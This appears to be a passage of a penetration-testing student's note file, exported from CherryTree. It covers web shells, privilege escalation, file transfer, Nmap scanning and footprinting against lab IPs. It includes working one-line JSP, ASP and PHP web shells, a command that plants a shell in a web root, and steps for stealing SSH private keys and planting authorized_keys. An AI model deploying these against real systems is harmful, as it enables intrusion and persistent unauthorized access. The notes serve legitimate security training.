	</rich_text>
        <rich_text underline="single">JSP:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace">&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;
</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">ASP:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace">&lt;% eval request("cmd") %&gt;</rich_text>
        <rich_text>




	</rich_text>
        <rich_text underline="single" weight="heavy">Uploading a web shell:</rich_text>
        <rich_text>

		We will need to place our web shell script in the remote hosts web directory in order to execute the script through the browser.
		
		</rich_text>
        <rich_text underline="single" style="italic">Default web roots for common web servers:</rich_text>
        <rich_text>
		
			</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text family="monospace" foreground="#ff7676">echo</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace"> /var/www/html/shell.php</rich_text>
        <rich_text>

A great benefit to web shells is that they generally bypass any firewall that is in place. As it will not open a new connection on a port. It will run on port 80 or 443, or whatever port the web application is using.</rich_text>
        <table char_offset="3319" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>Apache</cell>
            <cell>/var/www/html/</cell>
          </row>
          <row>
            <cell>Nginx</cell>
            <cell>/usr/local/nginx/html/</cell>
          </row>
          <row>
            <cell>IIS</cell>
            <cell>c:\inetpub\wwwroot\</cell>
          </row>
          <row>
            <cell>XAMPP</cell>
            <cell>C:\xampp\htdocs\</cell>
          </row>
          <row>
            <cell>Web Server</cell>
            <cell>Default Webroot</cell>
          </row>
        </table>
      </node>
      <node name="Privilege Escalation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677657473" ts_lastsave="1677701775">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Privilege Escalation Checklists:</rich_text>
        <rich_text>
	After initial access go through your various priv esc checklists to find any potential vulnerabilities to achieve higher privilege.
	
		* HackTricks 
		* Pentest Book
		* PayloadsAllTheThings
	
	
</rich_text>
        <rich_text underline="single" weight="heavy">Enumeration Scripts:</rich_text>
        <rich_text>
	Here are some common scripts to automatically enumerate the server. These scripts will run many commands and create a lot of noise.
	
		</rich_text>
        <rich_text underline="single">Linux:</rich_text>
        <rich_text>
			* LinEnum
			* LinPEAS
			* linuxprivchecker
		
		</rich_text>
        <rich_text underline="single">Windows:</rich_text>
        <rich_text>
			* Seatbelt
			* WinPEAS
			* JAWS
			

</rich_text>
        <rich_text underline="single" weight="heavy">Kernel Exploits</rich_text>
        <rich_text>:
	If a server is running an old operating system, search for vulnerabilities that may exist.
	

</rich_text>
        <rich_text underline="single" weight="heavy">Vulnerable Software:</rich_text>
        <rich_text>
	</rich_text>
        <rich_text underline="single">Search for vulnerable softare with:</rich_text>
        <rich_text>
		* dpkg -l
		* systemctl
		* top 
		* ps -aux
		
		
</rich_text>
        <rich_text weight="heavy">User Privileges:</rich_text>
        <rich_text>
	</rich_text>
        <rich_text underline="single">Common ways to exploit certain privileges:</rich_text>
        <rich_text>
		1.) sudo -l
		2.) sudo su -
		3.) sudo -u user /bin/echo Hello World!
		2.) SUID
		3.) Windows Token Privileges
		
	Once we find a application we can run with </rich_text>
        <rich_text weight="heavy">sudo</rich_text>
        <rich_text>, we can look for ways to exploit it and get a privileged shell.
	
		</rich_text>
        <rich_text underline="single">List of applications that can be used to escalate privileges:</rich_text>
        <rich_text>
			GTFOBins (Linux) - </rich_text>
        <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
        <rich_text>
			LOLBAS (Windows) - https://lolbas-project.github.io/
		
	
</rich_text>
        <rich_text underline="single" weight="heavy">Scheduled Tasks:</rich_text>
        <rich_text>
	
	</rich_text>
        <rich_text underline="single">Linux (Cron Jobs):</rich_text>
        <rich_text>
		1.) /etc/crontab
		2.) /etc/crond.
		3.) /var/spool/cron/crontabs/root
		
	Windows - Scheduled tasks:
	

</rich_text>
        <rich_text underline="single" weight="heavy">Exposed Credentials:</rich_text>
        <rich_text>
	This is very common with:
		1.) configuration files
		2.) log files
		3.) user history files </rich_text>
        <rich_text underline="single">.bash_history</rich_text>
        <rich_text> in Linux and </rich_text>
        <rich_text underline="single">PSReadLine</rich_text>
        <rich_text> in Windows.
	

</rich_text>
        <rich_text underline="single" weight="heavy">SSH Keys</rich_text>
        <rich_text>:
	If we have access to .ssh, we may read their private keys.
		1.) /home/user/.ssh/id_rsa
		2.) /root/.ssh/id_rsa
		
	Example:
		$ vim id_rsa
		$ chmod 600 id_rsa
		$ ssh user@10.10.10.121 -i id_rsa
	
	If we have write access to /.ssh/ we can place our public key in the users ssh directory at /home/user/.ssh/authorized_keys. We must first create a new key with ssh-keygen.
	This will give us two files, a private key and a public key. We will add the public key to the authorized_keys directory.	
	
	Example:
		$ ssh-keygen -f key
		$ echo “ssh-rsa AAAAB...SNIP...M= user@parot” &gt;&gt; /root.ssh/authorized_keys
		$ ssh root@10.10.10.121 -i key</rich_text>
      </node>
      <node name="Transferring Files" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677779696" ts_lastsave="1677781106">
        <rich_text>

</rich_text>
        <rich_text underline="single" weight="heavy">Using Wget:</rich_text>
        <rich_text>
	Run a python HTTP server on our machine and use wget or cURL to download the file on the targets machine.
		
		</rich_text>
        <rich_text underline="single">Our machine:</rich_text>
        <rich_text>
			$ cd /tmp
			$ python3 -m http.server 8080
		
		</rich_text>
        <rich_text underline="single">Target machine:</rich_text>
        <rich_text>
			$ wget </rich_text>
        <rich_text link="webs http://10.10.10.121:8080/linenum.sh">http://10.10.10.121:8080/linenum.sh</rich_text>
        <rich_text>
			or:
			$ curl </rich_text>
        <rich_text link="webs http://10.10.10.121:8080/linenum.sh">http://10.10.10.121:8080/linenum.sh</rich_text>
        <rich_text> -o linenum.sh
			

</rich_text>
        <rich_text underline="single" weight="heavy">Using SCP:</rich_text>
        <rich_text>
	If you have ssh user credentials for remote hosts you can transfer files with:
	
		$ scp linenum.sh user@remotehost:/tmp/linenum.sh
		

</rich_text>
        <rich_text underline="single" weight="heavy">Using Base64:</rich_text>
        <rich_text>
	In some cases, we may not be able to transfer the file. If the remote host has a firewall preventing us from downloading a file from our machine we can use a base64 trick to encode and decode the file.
	
	</rich_text>
        <rich_text underline="single">Base64 encode a file called “shell”:</rich_text>
        <rich_text>
		$ base64 shell -w 0
		
	</rich_text>
        <rich_text underline="single">Copy the base64 encoded string and decode on remote host:</rich_text>
        <rich_text>
		$ echo “f0VMIGRAAAAAAAAAAA.... &lt;Snip&gt; ..... lIuUdfnNJXSzsamdBUa” | base64 -d &gt; shell
		


</rich_text>
        <rich_text underline="single" weight="heavy">Validating File Transfers:</rich_text>
        <rich_text>
	
	</rich_text>
        <rich_text underline="single">Validate format of file:</rich_text>
        <rich_text>
		$ file shell
		
	</rich_text>
        <rich_text underline="single">Make sure we didn't mess up encoding / decoding process:</rich_text>
        <rich_text>
		
		The md5hash should be the same for both hosts.
		
		</rich_text>
        <rich_text underline="single">Local host:</rich_text>
        <rich_text>
		$ md5sum shell
		
		</rich_text>
        <rich_text underline="single">Remote host:</rich_text>
        <rich_text>
		$ md5sum shell</rich_text>
      </node>
    </node>
    <node name="Network Enumeration With Nmap" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677817215" ts_lastsave="1677867887">
      <node name="Host Enumeration" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677817244" ts_lastsave="1677820314">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Host Discovery</rich_text>
        <rich_text>:

	</rich_text>
        <rich_text underline="single">Scan network range:</rich_text>
        <rich_text>
		$ sudo nmap 10.10.2.0/24 -sn -oA tnet | grep for | cut -d “ ” -f5
		
		</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


	</rich_text>
        <rich_text underline="single">Disable arp ping:</rich_text>
        <rich_text>
		$ sudo nmap 10.10.2.23 -sn -oA host -PE --packet-trace --disable-arp-ping
		
		</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Host and Port Scanning:</rich_text>
        <rich_text>

	</rich_text>
        <rich_text justification="left" underline="single" foreground="#9eb3ca">There are a total of 6 different states for a scanned port we can obtain:</rich_text>
        <rich_text>
	
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Discovering Open TCP Ports:</rich_text>
        <rich_text>

	$ sudo nmap 10.10.10.3 --top-ports=10
	
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Discovering Open UDP Ports:</rich_text>
        <rich_text>

	$ sudo nmap 10.10.10.3 -F -sU 
	
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <table char_offset="112" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.0/24</cell>
            <cell>Target network range.</cell>
          </row>
          <row>
            <cell>-sn</cell>
            <cell>Disables port scanning.</cell>
          </row>
          <row>
            <cell>-oA tnet</cell>
            <cell>Stores the results in all formats starting with the name 'tnet'.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                                                         </cell>
          </row>
        </table>
        <table char_offset="216" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.18</cell>
            <cell>Performs defined scans against the target.</cell>
          </row>
          <row>
            <cell>-sn</cell>
            <cell>Disables port scanning.</cell>
          </row>
          <row>
            <cell>-oA host</cell>
            <cell>Stores the results in all formats starting with the name 'host'.</cell>
          </row>
          <row>
            <cell>-PE</cell>
            <cell>Performs the ping scan by using 'ICMP Echo requests' against the target.</cell>
          </row>
          <row>
            <cell>--reason</cell>
            <cell>Displays the reason for specific result.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                                                                                     </cell>
          </row>
        </table>
        <table char_offset="322" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>open</cell>
            <cell>This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.</cell>
          </row>
          <row>
            <cell>closed</cell>
            <cell>When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.</cell>
          </row>
          <row>
            <cell>filtered</cell>
            <cell>Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.</cell>
          </row>
          <row>
            <cell>unfiltered </cell>
            <cell>This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.</cell>
          </row>
          <row>
            <cell>open|filtered</cell>
            <cell>If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.</cell>
          </row>
          <row>
            <cell>closed|filtered</cell>
            <cell>This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.</cell>
          </row>
          <row>
            <cell>State                     </cell>
            <cell>Description                                                                                                                                           </cell>
          </row>
        </table>
        <table char_offset="397" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>--top-ports=10</cell>
            <cell>Scans the specified top ports that have been defined as most frequent.</cell>
          </row>
          <row>
            <cell>Scanning Options     </cell>
            <cell>Description                                                                                                            </cell>
          </row>
        </table>
        <table char_offset="465" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-F</cell>
            <cell>Scans top 100 ports.</cell>
          </row>
          <row>
            <cell>-sU</cell>
            <cell>Performs a UDP scan.</cell>
          </row>
          <row>
            <cell>Scanning Options      </cell>
            <cell>Description                                                                                  </cell>
          </row>
        </table>
      </node>
      <node name="Saving The Results" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677820356" ts_lastsave="1677820531">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Different Formats:</rich_text>
        <rich_text>

   ◇ Normal output (-oN) with the </rich_text>
        <rich_text underline="single">.nmap</rich_text>
        <rich_text> file extension
   ◇ Grepable output (-oG) with the </rich_text>
        <rich_text underline="single">.gnmap</rich_text>
        <rich_text> file extension
   ◇ XML output (-oX) with the </rich_text>
        <rich_text underline="single">.xml</rich_text>
        <rich_text> file extension



	$ sudo nmap 10.10.32.421 -p- -oA target
	
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <table char_offset="232" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-p-</cell>
            <cell>Scans all ports.</cell>
          </row>
          <row>
            <cell>-oA target</cell>
            <cell>Saves the results in all formats, starting the name of each file with 'target'.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                                                           </cell>
          </row>
        </table>
      </node>
      <node name="Service Enumeration / Timing" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677820823" ts_lastsave="1678044670">
        <rich_text>
When scanning a machine, or network, it's recommended to perform a small scan first. This uses less traffic which is advantageous for us because otherwise we can be blocked by security mechanisms if we're detected.

	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
	</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
	
	
	
</rich_text>
        <rich_text underline="single" weight="heavy">Timing:</rich_text>
        <rich_text>
	
	Nmap offers six different timing templates ( -T &lt;0-5&gt; ). These values determine the aggresiveness of the scan.
	
		* -T 0 / -T paranoid
		* -T 1 / -T sneaky
		* -T 2 / -T polite
		* -T 3 / -T normal
		* -T 4 / -T aggressive
		* -T 5 / -T insane

</rich_text>
        <table char_offset="218" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-p-</cell>
            <cell>Scans all ports.</cell>
          </row>
          <row>
            <cell>-sV</cell>
            <cell>Performs service version detection on specified ports.</cell>
          </row>
          <row>
            <cell>-Pn</cell>
            <cell>Disables ICMP Echo requests.</cell>
          </row>
          <row>
            <cell>-n</cell>
            <cell>Disables DNS resolution.</cell>
          </row>
          <row>
            <cell>--disable-arp-ping</cell>
            <cell>Disables ARP ping.</cell>
          </row>
          <row>
            <cell>--packet-trace</cell>
            <cell>Shows all packets sent and received.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description                                                           </cell>
          </row>
        </table>
        <table char_offset="221" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>--stats-every=5s</cell>
            <cell>Shows the progress of the scan every 5 seconds.</cell>
          </row>
        </table>
      </node>
      <node name="Nmap Scripting Engine" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677867887" ts_lastsave="1678209319">
        <rich_text>
Nmap Scripting Engine (NSE) allows us to create scripts in Lua for interaction with certain services.
There are a total of 14 categories into which these scripts can be divided:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



$ sudo nmap 10.129.2.28 -p --script banner, smtp-commands

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



$ sudo nmap 10.129.2.28 -p 80 -sV --script vuln


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text underline="single">Output from vuln scan:</rich_text>
        <rich_text>

</rich_text>
        <rich_text family="monospace" background="#000000000000">Nmap scan report for 10.129.2.28
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.3.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users:
| Username found: admin
</rich_text>
        <rich_text family="monospace" background="#000000000000" foreground="#9eb3ca">|_Search stopped at ID </rich_text>
        <rich_text family="monospace" background="#000000000000" foreground="#ff7676" weight="heavy">#</rich_text>
        <rich_text family="monospace" background="#000000000000" foreground="#ffb71a">25</rich_text>
        <rich_text family="monospace" background="#000000000000">. Increase the upper limit </rich_text>
        <rich_text family="monospace" background="#000000000000" foreground="#ff7676">if</rich_text>
        <rich_text family="monospace" background="#000000000000"> necessary with </rich_text>
        <rich_text family="monospace" background="#000000000000" foreground="#c4f465">'http-wordpress-users.limit'</rich_text>
        <rich_text family="monospace" background="#000000000000">
| vulners:
|   cpe:/a:apache:http_server:2.4.29:
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
&lt;SNIP&gt;</rich_text>
        <rich_text>



$ sudo nmap 10.10.23.121 -p80 --script http-enum
</rich_text>
        <table char_offset="180" justification="left" col_min="300" col_max="300" col_widths="0,0" is_light="1">
          <row>
            <cell>Auth</cell>
            <cell>Determine authentication credentials</cell>
          </row>
          <row>
            <cell>Broadcast</cell>
            <cell>Scripts which are used for host discovery by broadcasting and the discovered hosts can be automatically added to the existing scan</cell>
          </row>
          <row>
            <cell>Brute</cell>
            <cell>Execute scripts that try to login to the respective service by brute-forcing credentials</cell>
          </row>
          <row>
            <cell>Default</cell>
            <cell>Default scripts executed by using the "-sC" command</cell>
          </row>
          <row>
            <cell>Discovery</cell>
            <cell>Evaluation of accessible services.</cell>
          </row>
          <row>
            <cell>Dos</cell>
            <cell>Scripts to determine Denial of Service vulnerabilities... Used less as it is harmful to the service.</cell>
          </row>
          <row>
            <cell>Exploit</cell>
            <cell>Tries to exploit services with known vulnerabilities.</cell>
          </row>
          <row>
            <cell>External</cell>
            <cell>Scripts that use external services to perform.</cell>
          </row>
          <row>
            <cell>Fuzzer</cell>
            <cell>Sends variety of differnt fields for discovery </cell>
          </row>
          <row>
            <cell>Intrusive</cell>
            <cell>Intrusive scripts that could negatively effect the target system.</cell>
          </row>
          <row>
            <cell>Malware</cell>
            <cell>Check if some malware infects the target system</cell>
          </row>
          <row>
            <cell>Safe</cell>
            <cell>Defensive scripts that do not perform intrusive or destructiveness. </cell>
          </row>
          <row>
            <cell>Version</cell>
            <cell>Extension for version detection</cell>
          </row>
          <row>
            <cell>Vuln</cell>
            <cell>Indication of specific vulnerabilities</cell>
          </row>
          <row>
            <cell>Category</cell>
            <cell>Description</cell>
          </row>
        </table>
        <table char_offset="244" justification="left" col_min="300" col_max="300" col_widths="0,0">
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
          <row>
            <cell>-p 25</cell>
            <cell>Scans only the specified port.</cell>
          </row>
          <row>
            <cell>--script banner,smtp-commands</cell>
            <cell>Uses specified NSE scripts.</cell>
          </row>
          <row>
            <cell>Scanning Options</cell>
            <cell>Description</cell>
          </row>
        </table>
        <table char_offset="299" justification="left" col_min="300" col_max="300" col_widths="0,0">
          <row>
            <cell>-p 80</cell>
            <cell>Scans only the specified port.</cell>
          </row>
          <row>
            <cell>-sV</cell>
            <cell>Performs service version detection on specified ports.</cell>
          </row>
          <row>
            <cell>--script vuln</cell>
            <cell>Uses all related scripts from specified category.</cell>
          </row>
          <row>
            <cell>10.129.2.28</cell>
            <cell>Scans the specified target.</cell>
          </row>
        </table>
      </node>
    </node>
    <node name="Footprinting" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678138574" ts_lastsave="1678162140">
      <rich_text>
</rich_text>
      <rich_text underline="single" weight="heavy">Enumeration Principles:</rich_text>
      <rich_text>

	</rich_text>
      <rich_text style="italic" weight="heavy">Our goal is not to get at the system, but find all the ways to get there.</rich_text>
      <rich_text>

	</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
	
	
	* What can we see?
	* What reason can we have for seeing it?
	* What Image does what we see create for us?
	* What do we gain from it?
	
	* What can we not see?
	* What reasons can there be for what we do not see?
	* What image results for us from what we can not see?
	

</rich_text>
      <rich_text underline="single" weight="heavy">Layers of Enumeration Methodology:</rich_text>
      <rich_text>

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>


</rich_text>
      <rich_text underline="single">Layer 1 - Internet Presence:</rich_text>
      <rich_text>
	The goal of this layer is to identify all possible target systems and interfaces that can be tested.
	
</rich_text>
      <rich_text underline="single">Layer 2 - Gateway:</rich_text>
      <rich_text>
	The goal is to understand what we are dealing with and what we have to watch out for.

</rich_text>
      <rich_text underline="single">Layer 3 - Accessible Services:</rich_text>
      <rich_text>
	Understand the reason and functionality of the target system and gain the necessary knowledge to communicate with it and exploit it for our purposes effectively.
	
</rich_text>
      <rich_text underline="single">Layer 4 - Processes:</rich_text>
      <rich_text>
	The goal here to understand these factors (processes everytime a function is executed) and identify the dependencies between them.
	
</rich_text>
      <rich_text underline="single">Layer 5 - Privileges:</rich_text>
      <rich_text>
	It is crucial to indenity these and understand what is and is not possible with these privileges.	
	
</rich_text>
      <rich_text underline="single">Layer 6 - OS Setup:</rich_text>
      <rich_text>
	The goal is to understand how the administrators manage the system and what sensitive internal information we can glean from them.
	
	</rich_text>
      <table char_offset="103" justification="left" col_min="300" col_max="300" col_widths="0,0">
        <row>
          <cell>1.</cell>
          <cell>There is more than meets the eye. Consider all points of view.</cell>
        </row>
        <row>
          <cell>2.</cell>
          <cell>Distinguish between what we see and what we do not see.</cell>
        </row>
        <row>
          <cell>3.</cell>
          <cell>There are always ways to gain more information. Understand the target.</cell>
        </row>
        <row>
          <cell>No.</cell>
          <cell>Principle</cell>
        </row>
      </table>
      <table char_offset="418" justification="left" col_min="300" col_max="300" col_widths="0,0,0">
        <row>
          <cell>1. Internet Presence</cell>
          <cell>Identification of internet presence and externally accessible infrastructure.</cell>
          <cell>Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures</cell>
        </row>
        <row>
          <cell>2. Gateway</cell>
          <cell>Identify the possible security measures to protect the company's external and internal infrastructure.</cell>
          <cell>Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare</cell>
        </row>
        <row>
          <cell>3. Accessible Services</cell>
          <cell>Identify accessible interfaces and services that are hosted externally or internally.</cell>
          <cell>Service Type, Functionality, Configuration, Port, Version, Interface</cell>
        </row>
        <row>
          <cell>4. Processes</cell>
          <cell>Identify the internal processes, sources, and destinations associated with the services.</cell>
          <cell>PID, Processed Data, Tasks, Source, Destination</cell>
        </row>
        <row>
          <cell>5. Privileges</cell>
          <cell>Identification of the internal permissions and privileges to the accessible services.</cell>
          <cell>Groups, Users, Permissions, Restrictions, Environment</cell>
        </row>
        <row>
          <cell>6. OS Setup</cell>
          <cell>Identification of the internal components and systems setup.</cell>
          <cell>OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files</cell>
        </row>
        <row>
          <cell>Layer</cell>
          <cell>Description</cell>
          <cell>Information Categories</cell>
        </row>
      </table>
      <node name="Infrastructure Based Enumerations" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678144972" ts_lastsave="1678159929">
        <node name="Domain Information" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678159918" ts_lastsave="1678160526">
          <rich_text>
The first point of reference on the Internet may be the </rich_text>
          <rich_text underline="single" weight="heavy">SSL certificate</rich_text>
          <rich_text>. This often includes more than just a subdomain.

	</rich_text>
          <rich_text underline="single">Find information on SSL certificates:</rich_text>
          <rich_text>
		</rich_text>
          <rich_text link="webs https://crt.sh/">https://crt.sh/</rich_text>
          <rich_text>
		</rich_text>
          <rich_text link="webs https://shodan.io/">https://shodan.io/</rich_text>
          <rich_text>
		

</rich_text>
          <rich_text underline="single">DNS Records:</rich_text>
          <rich_text>
	$ dig any inlanefreight.com
	
</rich_text>
        </node>
        <node name="Cloud Resources" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678159925" ts_lastsave="1678161159">
          <rich_text>
Cloud resources if configured incorrectly can be accessed without authentication.
	- s3 buckets (AWS)
	- blobs (Azure)
	- cloud storage (GCP)
	
One of the easiest and most used methods for finding cloud storage is a google search combined with Google Dorks

	</rich_text>
          <rich_text underline="single">Google Search for AWS:</rich_text>
          <rich_text>
		intext: “target” inurl:amazonaws.com
	
	</rich_text>
          <rich_text underline="single">Google Search for Azure:</rich_text>
          <rich_text>
		intext: “target” inurl:blob.core.windows.net
	
These urls often contain PDFS, presentations, and other files. 

</rich_text>
          <rich_text underline="single" weight="heavy">Target Website - Source Code</rich_text>
          <rich_text weight="heavy">:</rich_text>
          <rich_text>
	Third-party providers can also tell us a lot about a companies infrastructure as well as Cloudflare's security assessment. (which will help with second layer - Gateway)
	
	
</rich_text>
          <rich_text underline="single" weight="heavy">Domain Glass:</rich_text>
          <rich_text>
	</rich_text>
          <rich_text link="webs https://domain.glass">https://domain.glass</rich_text>
          <rich_text> - DNS / WHOS Lookup
	
</rich_text>
          <rich_text underline="single" weight="heavy">GrayHatWarfare:</rich_text>
          <rich_text>
	</rich_text>
          <rich_text link="webs https://buckets.grayhatwarefar.com">https://buckets.grayhatwarefar.com</rich_text>
          <rich_text> - Search Public Buckets
	
	</rich_text>
        </node>
        <node name="Staff" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678159929" ts_lastsave="1678162093">
          <rich_text>
Searching for employees yields valuable information 
	- Skills
	- Infrastructure
	

</rich_text>
          <rich_text underline="single" weight="heavy">Linkedin:</rich_text>
          <rich_text>
	
	</rich_text>
          <rich_text underline="single">- Viewing job posts:</rich_text>
          <rich_text>
		- What programming languages does the company prefer?
		- What databases does the company look for?
		- What web application framework do they use?
		
	</rich_text>
          <rich_text underline="single">Viewing employees:</rich_text>
          <rich_text>
		What social media, contact info do they have available? 
		
	
	
</rich_text>
          <rich_text underline="single" weight="heavy">Xing:</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" weight="heavy">Github:</rich_text>
        </node>
      </node>
      <node name="Host Based Enumeration" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678162140" ts_lastsave="1678165241">
        <node name="FTP" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678162146" ts_lastsave="1678165230">
          <rich_text>
</rich_text>
          <rich_text underline="single" weight="heavy">Default Configurations:</rich_text>
          <rich_text>
	On of the most used FTP servers on Linux-based distributions is vsFTPd. The default configurations of vsFTP can be found:
		</rich_text>
          <rich_text underline="single">/etc/vsftpd.conf</rich_text>
          <rich_text>
		
I</rich_text>
          <rich_text underline="single" weight="heavy">nstall vsFTPd:</rich_text>
          <rich_text>
	$ sudo apt install vsftpd

</rich_text>
          <rich_text underline="single" weight="heavy">vsFTPd Config File:</rich_text>
          <rich_text>
	$ cat /etc/vsftpd.conf | grep -v “#”

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text underline="single" weight="heavy">FTPUSERS:</rich_text>
          <rich_text>
	This file is used to deny certain users access to the FTP service.
	
	$ cat /etc/ftpusers
	

</rich_text>
          <rich_text underline="single" weight="heavy">Dangerous Settings:</rich_text>
          <rich_text>
	The anonymous user is often used to allow everyone on the internal network to share iles and data without accessing each other's computer.
	This user can be added to the configuration file as follows:
	
	</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
	
	
</rich_text>
          <rich_text underline="single" weight="heavy">Download all available files:</rich_text>
          <rich_text>
	$ wget -m --no-passive </rich_text>
          <rich_text link="webs ftp://anonymous:anonymous@10.129.14.136">ftp://anonymous:anonymous@10.129.14.136</rich_text>
          <rich_text>
	

</rich_text>
          <rich_text underline="single" weight="heavy">Footprinting the Service:</rich_text>
          <rich_text>
	Using various network scanners is a handy and widespread approach.
	
	</rich_text>
